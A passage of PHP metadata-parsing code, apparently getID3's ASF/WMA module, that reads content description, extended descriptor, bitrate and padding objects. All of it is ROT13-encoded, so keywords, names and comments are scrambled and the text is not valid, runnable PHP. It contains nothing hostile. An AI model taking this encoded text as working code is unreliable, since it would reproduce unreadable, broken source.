							$guvf->jneavat('reebe_pbeerpgvba_bowrpg.reebe_pbeerpgvba_glcr THVQ {'.$guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_reebepbeerpgvbabowrpg['reebe_pbeerpgvba_glcr']).'} qbrf abg zngpu rkcrpgrq \"TRGVQ3_NFS_Ab_Reebe_Pbeerpgvba\" THVQ {'.$guvf->OlgrfgevatGbTHVQ(TRGVQ3_NFS_Ab_Reebe_Pbeerpgvba).'} be  \"TRGVQ3_NFS_Nhqvb_Fcernq\" THVQ {'.$guvf->OlgrfgevatGbTHVQ(TRGVQ3_NFS_Nhqvb_Fcernq).'}');
							//erghea snyfr;
							oernx;
					}

					oernx;

				pnfr TRGVQ3_NFS_Pbagrag_Qrfpevcgvba_Bowrpg:
					// Pbagrag Qrfpevcgvba Bowrpg: (bcgvbany, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Pbagrag Qrfpevcgvba bowrpg - TRGVQ3_NFS_Pbagrag_Qrfpevcgvba_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Pbagrag Qrfpevcgvba bowrpg, vapyhqvat 34 olgrf bs Pbagrag Qrfpevcgvba Bowrpg urnqre
					// Gvgyr Yratgu                 JBEQ         16              // ahzore bs olgrf va Gvgyr svryq
					// Nhgube Yratgu                JBEQ         16              // ahzore bs olgrf va Nhgube svryq
					// Pbclevtug Yratgu             JBEQ         16              // ahzore bs olgrf va Pbclevtug svryq
					// Qrfpevcgvba Yratgu           JBEQ         16              // ahzore bs olgrf va Qrfpevcgvba svryq
					// Engvat Yratgu                JBEQ         16              // ahzore bs olgrf va Engvat svryq
					// Gvgyr                        JPUNE        16              // neenl bs Havpbqr punenpgref - Gvgyr
					// Nhgube                       JPUNE        16              // neenl bs Havpbqr punenpgref - Nhgube
					// Pbclevtug                    JPUNE        16              // neenl bs Havpbqr punenpgref - Pbclevtug
					// Qrfpevcgvba                  JPUNE        16              // neenl bs Havpbqr punenpgref - Qrfpevcgvba
					// Engvat                       JPUNE        16              // neenl bs Havpbqr punenpgref - Engvat

					// fubegphg
					$guvfsvyr_nfs['pbagrag_qrfpevcgvba_bowrpg'] = neenl();
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg      = &$guvfsvyr_nfs['pbagrag_qrfpevcgvba_bowrpg'];

					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['bssfrg']                = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['bowrpgvq']              = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['bowrpgvq_thvq']         = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['bowrpgfvmr']            = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['gvgyr_yratgu']          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['nhgube_yratgu']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['pbclevtug_yratgu']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['qrfpevcgvba_yratgu']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['engvat_yratgu']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['gvgyr']                 = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['gvgyr_yratgu']);
					$bssfrg += $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['gvgyr_yratgu'];
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['nhgube']                = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['nhgube_yratgu']);
					$bssfrg += $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['nhgube_yratgu'];
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['pbclevtug']             = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['pbclevtug_yratgu']);
					$bssfrg += $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['pbclevtug_yratgu'];
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['qrfpevcgvba']           = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['qrfpevcgvba_yratgu']);
					$bssfrg += $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['qrfpevcgvba_yratgu'];
					$guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['engvat']                = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['engvat_yratgu']);
					$bssfrg += $guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg['engvat_yratgu'];

					$NFSpbzzragXrlfGbPbcl = neenl('gvgyr'=>'gvgyr', 'nhgube'=>'negvfg', 'pbclevtug'=>'pbclevtug', 'qrfpevcgvba'=>'pbzzrag', 'engvat'=>'engvat');
					sbernpu ($NFSpbzzragXrlfGbPbcl nf $xrlgbpbclsebz => $xrlgbpbclgb) {
						vs (!rzcgl($guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg[$xrlgbpbclsebz])) {
							$guvfsvyr_nfs_pbzzragf[$xrlgbpbclgb][] = $guvf->GevzGrez($guvfsvyr_nfs_pbagragqrfpevcgvbabowrpg[$xrlgbpbclsebz]);
						}
					}
					oernx;

				pnfr TRGVQ3_NFS_Rkgraqrq_Pbagrag_Qrfpevcgvba_Bowrpg:
					// Rkgraqrq Pbagrag Qrfpevcgvba Bowrpg: (bcgvbany, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Rkgraqrq Pbagrag Qrfpevcgvba bowrpg - TRGVQ3_NFS_Rkgraqrq_Pbagrag_Qrfpevcgvba_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs RkgraqrqPbagrag Qrfpevcgvba bowrpg, vapyhqvat 26 olgrf bs Rkgraqrq Pbagrag Qrfpevcgvba Bowrpg urnqre
					// Pbagrag Qrfpevcgbef Pbhag    JBEQ         16              // ahzore bs ragevrf va Pbagrag Qrfpevcgbef yvfg
					// Pbagrag Qrfpevcgbef          neenl bs:    inevnoyr        //
					// * Qrfpevcgbe Anzr Yratgu     JBEQ         16              // fvmr va olgrf bs Qrfpevcgbe Anzr svryq
					// * Qrfpevcgbe Anzr            JPUNE        inevnoyr        // neenl bs Havpbqr punenpgref - Qrfpevcgbe Anzr
					// * Qrfpevcgbe Inyhr Qngn Glcr JBEQ         16              // Ybbxhc neenl:
																					// 0k0000 = Havpbqr Fgevat (inevnoyr yratgu)
																					// 0k0001 = OLGR neenl     (inevnoyr yratgu)
																					// 0k0002 = OBBY           (QJBEQ, 32 ovgf)
																					// 0k0003 = QJBEQ          (QJBEQ, 32 ovgf)
																					// 0k0004 = DJBEQ          (DJBEQ, 64 ovgf)
																					// 0k0005 = JBEQ           (JBEQ,  16 ovgf)
					// * Qrfpevcgbe Inyhr Yratgu    JBEQ         16              // ahzore bs olgrf fgberq va Qrfpevcgbe Inyhr svryq
					// * Qrfpevcgbe Inyhr           inevnoyr     inevnoyr        // inyhr sbe Pbagrag Qrfpevcgbe

					// fubegphg
					$guvfsvyr_nfs['rkgraqrq_pbagrag_qrfpevcgvba_bowrpg'] = neenl();
					$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg       = &$guvfsvyr_nfs['rkgraqrq_pbagrag_qrfpevcgvba_bowrpg'];

					$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg['bssfrg']                    = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg['bowrpgvq']                  = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg['bowrpgvq_thvq']             = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg['bowrpgfvmr']                = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg['pbagrag_qrfpevcgbef_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					sbe ($RkgraqrqPbagragQrfpevcgbefPbhagre = 0; $RkgraqrqPbagragQrfpevcgbefPbhagre < $guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg['pbagrag_qrfpevcgbef_pbhag']; $RkgraqrqPbagragQrfpevcgbefPbhagre++) {
						// fubegphg
						$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg['pbagrag_qrfpevcgbef'][$RkgraqrqPbagragQrfpevcgbefPbhagre] = neenl();
						$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag                 = &$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg['pbagrag_qrfpevcgbef'][$RkgraqrqPbagragQrfpevcgbefPbhagre];

						$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['onfr_bssfrg']  = $bssfrg + 30;
						$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['anzr_yratgu']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['anzr']         = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['anzr_yratgu']);
						$bssfrg += $guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['anzr_yratgu'];
						$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr_glcr']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr_yratgu'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']        = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr_yratgu']);
						$bssfrg += $guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr_yratgu'];
						fjvgpu ($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr_glcr']) {
							pnfr 0k0000: // Havpbqr fgevat
								oernx;

							pnfr 0k0001: // OLGR neenl
								// qb abguvat
								oernx;

							pnfr 0k0002: // OBBY
								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr'] = (obby) trgvq3_yvo::YvggyrRaqvna2Vag($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']);
								oernx;

							pnfr 0k0003: // QJBEQ
							pnfr 0k0004: // DJBEQ
							pnfr 0k0005: // JBEQ
								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr'] = trgvq3_yvo::YvggyrRaqvna2Vag($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']);
								oernx;

							qrsnhyg:
								$guvf->jneavat('rkgraqrq_pbagrag_qrfpevcgvba.pbagrag_qrfpevcgbef.'.$RkgraqrqPbagragQrfpevcgbefPbhagre.'.inyhr_glcr vf vainyvq ('.$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr_glcr'].')');
								//erghea snyfr;
								oernx;
						}
						fjvgpu ($guvf->GevzPbaireg(fgegbybjre($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['anzr']))) {

							pnfr 'jz/nyohznegvfg':
							pnfr 'negvfg':
								// Abgr: abg 'negvfg', gung pbzrf sebz 'nhgube' gnt
								$guvfsvyr_nfs_pbzzragf['nyohznegvfg'] = neenl($guvf->GevzGrez($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
								oernx;

							pnfr 'jz/nyohzgvgyr':
							pnfr 'nyohz':
								$guvfsvyr_nfs_pbzzragf['nyohz']  = neenl($guvf->GevzGrez($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
								oernx;

							pnfr 'jz/traer':
							pnfr 'traer':
								$guvfsvyr_nfs_pbzzragf['traer'] = neenl($guvf->GevzGrez($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
								oernx;

							pnfr 'jz/cnegbsfrg':
								$guvfsvyr_nfs_pbzzragf['cnegbsfrg'] = neenl($guvf->GevzGrez($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
								oernx;

							pnfr 'jz/genpxahzore':
							pnfr 'genpxahzore':
								// or pnershy pnfgvat gb vag: pnfgvat havpbqr fgevatf gb vag tvirf harkcrpgrq erfhygf (fgbcf cnefvat ng svefg aba-ahzrevp punenpgre)
								$guvfsvyr_nfs_pbzzragf['genpx_ahzore'] = neenl($guvf->GevzGrez($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
								sbernpu ($guvfsvyr_nfs_pbzzragf['genpx_ahzore'] nf $xrl => $inyhr) {
									vs (cert_zngpu('/^[0-9\k00]+$/', $inyhr)) {
										$guvfsvyr_nfs_pbzzragf['genpx_ahzore'][$xrl] = vaginy(fge_ercynpr(\"\k00\", '', $inyhr));
									}
								}
								oernx;

							pnfr 'jz/genpx':
								vs (rzcgl($guvfsvyr_nfs_pbzzragf['genpx_ahzore'])) {
									$guvfsvyr_nfs_pbzzragf['genpx_ahzore'] = neenl(1 + (vag) $guvf->GevzPbaireg($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
								}
								oernx;

							pnfr 'jz/lrne':
							pnfr 'lrne':
							pnfr 'qngr':
								$guvfsvyr_nfs_pbzzragf['lrne'] = neenl( $guvf->GevzGrez($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
								oernx;

							pnfr 'jz/ylevpf':
							pnfr 'ylevpf':
								$guvfsvyr_nfs_pbzzragf['ylevpf'] = neenl($guvf->GevzGrez($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
								oernx;

							pnfr 'vfioe':
								vs ($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']) {
									$guvfsvyr_nhqvb['ovgengr_zbqr'] = 'ioe';
									$guvfsvyr_ivqrb['ovgengr_zbqr'] = 'ioe';
								}
								oernx;

							pnfr 'vq3':
								$guvf->trgvq3->vapyhqr_zbqhyr('gnt.vq3i2');

								$trgvq3_vq3i2 = arj trgvq3_vq3i2($guvf->trgvq3);
								$trgvq3_vq3i2->NanylmrFgevat($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']);
								hafrg($trgvq3_vq3i2);

								vs ($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr_yratgu'] > 1024) {
									$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr'] = '<inyhr gbb ynetr gb qvfcynl>';
								}
								oernx;

							pnfr 'jz/rapbqvatgvzr':
								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['rapbqvat_gvzr_havk'] = $guvf->SVYRGVZRgbHAVKgvzr($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']);
								$guvfsvyr_nfs_pbzzragf['rapbqvat_gvzr_havk'] = neenl($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['rapbqvat_gvzr_havk']);
								oernx;

							pnfr 'jz/cvpgher':
								$JZcvpgher = $guvf->NFS_JZcvpgher($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']);
								sbernpu ($JZcvpgher nf $xrl => $inyhr) {
									$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag[$xrl] = $inyhr;
								}
								hafrg($JZcvpgher);
/*
								$jz_cvpgher_bssfrg = 0;
								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_glcr_vq'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr'], $jz_cvpgher_bssfrg, 1));
								$jz_cvpgher_bssfrg += 1;
								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_glcr']    = frys::JZcvpgherGlcrYbbxhc($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_glcr_vq']);
								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_fvmr']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr'], $jz_cvpgher_bssfrg, 4));
								$jz_cvpgher_bssfrg += 4;

								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_zvzr'] = '';
								qb {
									$arkg_olgr_cnve = fhofge($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr'], $jz_cvpgher_bssfrg, 2);
									$jz_cvpgher_bssfrg += 2;
									$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_zvzr'] .= $arkg_olgr_cnve;
								} juvyr ($arkg_olgr_cnve !== \"\k00\k00\");

								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_qrfpevcgvba'] = '';
								qb {
									$arkg_olgr_cnve = fhofge($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr'], $jz_cvpgher_bssfrg, 2);
									$jz_cvpgher_bssfrg += 2;
									$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_qrfpevcgvba'] .= $arkg_olgr_cnve;
								} juvyr ($arkg_olgr_cnve !== \"\k00\k00\");

								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['qngnbssfrg'] = $jz_cvpgher_bssfrg;
								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['qngn'] = fhofge($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr'], $jz_cvpgher_bssfrg);
								hafrg($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']);

								$vzntrvasb = neenl();
								$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_zvzr'] = '';
								$vzntrpuhaxpurpx = trgvq3_yvo::TrgQngnVzntrFvmr($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['qngn'], $vzntrvasb);
								hafrg($vzntrvasb);
								vs (!rzcgl($vzntrpuhaxpurpx)) {
									$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_zvzr'] = vzntr_glcr_gb_zvzr_glcr($vzntrpuhaxpurpx[2]);
								}
								vs (!vffrg($guvfsvyr_nfs_pbzzragf['cvpgher'])) {
									$guvfsvyr_nfs_pbzzragf['cvpgher'] = neenl();
								}
								$guvfsvyr_nfs_pbzzragf['cvpgher'][] = neenl('qngn'=>$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['qngn'], 'vzntr_zvzr'=>$guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['vzntr_zvzr']);
*/
								oernx;

							qrsnhyg:
								fjvgpu ($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr_glcr']) {
									pnfr 0: // Havpbqr fgevat
										vs (fhofge($guvf->GevzPbaireg($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['anzr']), 0, 3) == 'JZ/') {
											$guvfsvyr_nfs_pbzzragf[fge_ercynpr('jz/', '', fgegbybjre($guvf->GevzPbaireg($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['anzr'])))] = neenl($guvf->GevzGrez($guvfsvyr_nfs_rkgraqrqpbagragqrfpevcgvbabowrpg_pbagragqrfpevcgbe_pheerag['inyhr']));
										}
										oernx;

									pnfr 1:
										oernx;
								}
								oernx;
						}

					}
					oernx;

				pnfr TRGVQ3_NFS_Fgernz_Ovgengr_Cebcregvrf_Bowrpg:
					// Fgernz Ovgengr Cebcregvrf Bowrpg: (bcgvbany, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Fgernz Ovgengr Cebcregvrf bowrpg - TRGVQ3_NFS_Fgernz_Ovgengr_Cebcregvrf_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Rkgraqrq Pbagrag Qrfpevcgvba bowrpg, vapyhqvat 26 olgrf bs Fgernz Ovgengr Cebcregvrf Bowrpg urnqre
					// Ovgengr Erpbeqf Pbhag        JBEQ         16              // ahzore bs erpbeqf va Ovgengr Erpbeqf
					// Ovgengr Erpbeqf              neenl bs:    inevnoyr        //
					// * Syntf                      JBEQ         16              //
					// * * Fgernz Ahzore            ovgf         7  (0k007S)     // ahzore bs guvf fgernz
					// * * Erfreirq                 ovgf         9  (0kSS80)     // uneqpbqrq: 0
					// * Nirentr Ovgengr            QJBEQ        32              // va ovgf cre frpbaq

					// fubegphg
					$guvfsvyr_nfs['fgernz_ovgengr_cebcregvrf_bowrpg'] = neenl();
					$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg       = &$guvfsvyr_nfs['fgernz_ovgengr_cebcregvrf_bowrpg'];

					$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['bssfrg']                    = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['bowrpgvq']                  = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['bowrpgvq_thvq']             = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['bowrpgfvmr']                = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf_pbhag']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					sbe ($OvgengrErpbeqfPbhagre = 0; $OvgengrErpbeqfPbhagre < $guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf_pbhag']; $OvgengrErpbeqfPbhagre++) {
						$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf'][$OvgengrErpbeqfPbhagre]['syntf_enj'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf'][$OvgengrErpbeqfPbhagre]['syntf']['fgernz_ahzore'] = $guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf'][$OvgengrErpbeqfPbhagre]['syntf_enj'] & 0k007S;
						$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg['ovgengr_erpbeqf'][$OvgengrErpbeqfPbhagre]['ovgengr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
						$bssfrg += 4;
					}
					oernx;

				pnfr TRGVQ3_NFS_Cnqqvat_Bowrpg:
					// Cnqqvat Bowrpg: (bcgvbany)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Cnqqvat bowrpg - TRGVQ3_NFS_Cnqqvat_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Cnqqvat bowrpg, vapyhqvat 24 olgrf bs NFS Cnqqvat Bowrpg urnqre
					// Cnqqvat Qngn                 OLGRFGERNZ   inevnoyr        // vtaber

					// fubegphg
					$guvfsvyr_nfs['cnqqvat_bowrpg'] = neenl();
					$guvfsvyr_nfs_cnqqvatbowrpg     = &$guvfsvyr_nfs['cnqqvat_bowrpg'];

					$guvfsvyr_nfs_cnqqvatbowrpg['bssfrg']                    = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_cnqqvatbowrpg['bowrpgvq']                  = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_cnqqvatbowrpg['bowrpgvq_thvq']             = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_cnqqvatbowrpg['bowrpgfvmr']                = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_cnqqvatbowrpg['cnqqvat_yratgu']            = $guvfsvyr_nfs_cnqqvatbowrpg['bowrpgfvmr'] - 16 - 8;
					$guvfsvyr_nfs_cnqqvatbowrpg['cnqqvat']                   = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_cnqqvatbowrpg['cnqqvat_yratgu']);
					$bssfrg += ($ArkgBowrpgFvmr - 16 - 8);
					oernx;

				pnfr TRGVQ3_NFS_Rkgraqrq_Pbagrag_Rapelcgvba_Bowrpg:
				pnfr TRGVQ3_NFS_Pbagrag_Rapelcgvba_Bowrpg:
					// JZN QEZ - whfg vtaber
					$bssfrg += ($ArkgBowrpgFvmr - 16 - 8);
					oernx;

				qrsnhyg:
					// Vzcyrzragngvbaf funyy vtaber nal fgnaqneq be aba-fgnaqneq bowrpg gung gurl qb abg xabj ubj gb unaqyr.
					vs ($guvf->THVQanzr($ArkgBowrpgTHVQgrkg)) {
						$guvf->jneavat('haunaqyrq THVQ \"'.$guvf->THVQanzr($ArkgBowrpgTHVQgrkg).'\" {'.$ArkgBowrpgTHVQgrkg.'} va NFS urnqre ng bssfrg '.($bssfrg - 16 - 8));
					} ryfr {
